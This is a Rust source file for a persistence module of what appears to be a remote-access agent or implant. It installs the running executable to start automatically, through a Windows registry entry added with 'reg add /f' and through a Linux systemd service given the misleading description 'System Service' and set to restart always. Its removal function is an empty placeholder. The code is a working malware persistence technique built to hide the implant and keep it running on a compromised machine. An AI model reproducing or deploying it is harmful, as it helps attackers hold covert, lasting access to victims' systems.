use nexus_common::*;

pub struct PersistenceManager;

impl PersistenceManager {
    pub fn new() -> Self {
        Self
    }

    #[cfg(target_os = "windows")]
    pub async fn install_registry_persistence(&self, key_path: &str, value_name: &str) -> Result<()> {
        use std::process::Command;
        
        let exe_path = std::env::current_exe()
            .map_err(|e| NexusError::AgentError(format!("Failed to get executable path: {}", e)))?;

        let output = Command::new("reg")
            .args(&[
                "add", key_path,
                "/v", value_name,
                "/t", "REG_SZ",
                "/d", &exe_path.to_string_lossy(),
                "/f"
            ])
            .output()
            .map_err(|e| NexusError::AgentError(format!("Registry persistence failed: {}", e)))?;

        if output.status.success() {
            Ok(())
        } else {
            Err(NexusError::AgentError(
                format!("Registry persistence error: {}", String::from_utf8_lossy(&output.stderr))
            ))
        }
    }

    #[cfg(target_os = "linux")]
    pub async fn install_systemd_persistence(&self, service_name: &str) -> Result<()> {
        let exe_path = std::env::current_exe()
            .map_err(|e| NexusError::AgentError(format!("Failed to get executable path: {}", e)))?;

        let service_content = format!(
            "[Unit]\nDescription=System Service\n\n[Service]\nExecStart={}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n",
            exe_path.to_string_lossy()
        );

        let service_path = format!("/etc/systemd/system/{}.service", service_name);
        
        std::fs::write(&service_path, service_content)
            .map_err(|e| NexusError::AgentError(format!("Failed to write service file: {}", e)))?;

        Ok(())
    }

    pub async fn remove_persistence(&self) -> Result<()> {
        // Placeholder for persistence removal
        Ok(())
    }
}

impl Default for PersistenceManager {
    fn default() -> Self {
        Self::new()
    }
}
